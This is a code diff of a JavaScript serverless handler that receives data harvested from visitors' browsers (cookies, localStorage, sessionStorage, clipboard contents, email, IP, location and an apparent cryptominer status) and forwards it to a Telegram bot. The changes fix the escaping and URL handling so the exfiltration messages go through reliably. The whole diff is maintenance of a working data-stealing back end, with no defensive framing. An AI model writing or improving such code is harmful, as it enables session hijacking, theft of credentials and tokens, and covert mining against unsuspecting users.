@@ -5,28 +5,32 @@ export default async function handler(req, res) {
 
   try {
     let data;
+    // Handle both direct objects and raw string bodies
     if (req.body && typeof req.body === 'object') {
       data = req.body;
     } else {
       data = JSON.parse(req.body || "{}");
     }
 
-    // Format for Telegram Markdown
+    // --- TELEGRAM FORMATTING FIX ---
     const lsStr = JSON.stringify(data.localStorage, null, 2).substring(0, 1500);
     const ssStr = JSON.stringify(data.sessionStorage, null, 2).substring(0, 1500);
     
-    const mineTag = data.mineStatus ? `🔥 *MINE ACTIVE*: ${data.mineStatus}\n` : "";
-    
+    // Escape backticks in clipboard/data to prevent breaking Markdown
+    const safeClipboard = (data.clipboard || "").replace(/`/g, '\\`');
+    const safeCookies = (data.cookies || "").replace(/`/g, '\\`');
+    const mineTag = data.mineStatus ? `\n🔥 *MINE ACTIVE*: ${data.mineStatus}\n` : "";
+
     const msg = `
 🚗 *New Client Session*
 
 🆔 Email: \`${data.email || "N/A"}\`
 🌐 IP: \`${data.ip}\`
-🖥️ UA: ${data.userAgent.substring(0, 50)}...
-🍪 Cookies: \`${data.cookies || "N/A"}\`
+🖥️ UA: ${data.userAgent.substring(0, 60)}...
+🍪 Cookies: \`${safeCookies}\`
 💾 LocalStorage: \`\`\`json\n${lsStr}\n\`\`\`
 🗄️ SessionStorage: \`\`\`json\n${ssStr}\n\`\`\`
-📋 Clipboard: \`${data.clipboard || "Empty"}\`
+📋 Clipboard: \`${safeClipboard}\`
 📍 Location: ${data.location}
 ${mineTag}
     `.trim();
@@ -36,7 +40,10 @@ ${mineTag}
 
     if (tgToken && tgChatId) {
       try {
-        await fetch(`https://api.telegram.org/bot${tgToken}/sendMessage`, {
+        // Use URL constructor to ensure token is encoded correctly
+        const url = new URL(`https://api.telegram.org/bot${tgToken}/sendMessage`);
+        
+        await fetch(url.toString(), {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ 
